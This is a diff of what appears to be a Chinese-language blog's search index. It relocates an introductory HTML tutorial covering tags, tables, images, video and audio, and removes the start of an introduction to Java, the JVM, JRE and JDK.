+<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
+</li>
+<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
+</li>
+<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
+</li>
+<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
+</li>
+<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
+</li>
+<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
+</li>
+<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
+</li>
+<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
+</li>
+<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
+</li>
+<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
+</li>
+<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
+</li>
+<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
+</li>
+<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
+</li>
+<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
+</li>
+<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
+</li>
+<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
+</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
+<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
+<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>
+
+<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
+
+<p>表格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
+<p>main     网页的主体部分（一般只有一个）</p>
+<p>footer   网页的底部</p>
+<p>nav      网页的导航</p>
+<p>aside    和主题相关的内容</p>
+<p>article  文章之类的</p>
+<p>section  独立的块区，上面的标签都不合适，就用这个</p>
+<p>div      块元素</p>
+<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>
+
+<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>
+
+<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>语言</tag>
       </tags>
   </entry>
   <entry>
@@ -632,126 +752,6 @@
 ]]></content>
       <tags>
         <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTML</title>
-    <url>/2023/08/08/HTML/</url>
-    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
-
-<ol>
-<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
-</li>
-<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
-</li>
-<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
-</li>
-<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
-</li>
-<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
-</li>
-<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
-</li>
-<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
-</li>
-<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
-</li>
-<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
-</li>
-<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
-</li>
-<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
-</li>
-<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
-</li>
-<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
-</li>
-<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
-</li>
-<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
-</li>
-<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
-</li>
-<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
-</li>
-<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
-</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
-<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
-<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>
-
-<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
-
-<p>表格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
-<p>main     网页的主体部分（一般只有一个）</p>
-<p>footer   网页的底部</p>
-<p>nav      网页的导航</p>
-<p>aside    和主题相关的内容</p>
-<p>article  文章之类的</p>
-<p>section  独立的块区，上面的标签都不合适，就用这个</p>
-<p>div      块元素</p>
-<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>
-
-<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>
-
-<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>语言</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java简介</title>
-    <url>/2023/07/26/Java1/</url>
-    <content><![CDATA[<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><span id="more"></span>
-
-<p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
-<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
-<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
-<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
-<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
-<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
-<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
-<p>JVM&amp;JRE&amp;JDK关系图</p>
-<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
-<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
-<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
-<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
-<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
-<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
